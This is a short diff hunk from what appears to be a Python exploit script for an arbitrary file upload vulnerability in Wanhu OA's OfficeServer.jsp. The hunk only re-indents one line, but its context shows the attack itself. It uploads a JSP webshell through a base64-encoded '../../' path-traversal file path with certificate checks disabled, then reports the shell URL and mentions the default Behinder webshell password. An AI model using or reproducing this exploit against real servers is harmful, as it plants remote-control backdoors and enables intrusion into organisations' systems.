@@ -34,7 +34,7 @@ FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(exp_url, headers=headers, data=data, verify=False)
         if respones1.status_code == 200:
-        shell_url=target_url+'defaultroot/public/edit/cmd_test.jsp'
+            shell_url=target_url+'defaultroot/public/edit/cmd_test.jsp'
             console.print(now_time() + ' [SUCCESS]  上传webshell成功，默认冰蝎密码:{}'.format(shell_url), style='bold green')
         else:
             console.print(now_time() + ' [WARNING]  万户OA OfficeServer.jsp 任意文件上传漏洞不存在', style='bold red ')
